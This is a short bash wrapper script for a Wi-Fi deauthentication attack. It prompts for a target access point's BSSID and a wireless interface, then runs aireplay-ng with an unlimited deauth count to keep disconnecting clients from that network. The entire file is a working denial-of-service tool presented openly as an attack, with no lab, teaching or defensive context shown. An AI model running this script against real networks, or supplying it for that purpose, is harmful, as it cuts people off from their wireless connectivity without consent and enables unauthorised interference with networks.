#!/bin/bash
echo "========================================="
echo "     DEAUTH ATTACK (aireplay-ng)"
echo "========================================="
echo ""
read -p "Enter BSSID: " BSSID
read -p "Enter Interface: " INTERFACE
echo ""
echo "Running deauth attack on $BSSID"
echo "Press Ctrl+C to stop"
sudo aireplay-ng --deauth 0 -a $BSSID $INTERFACE
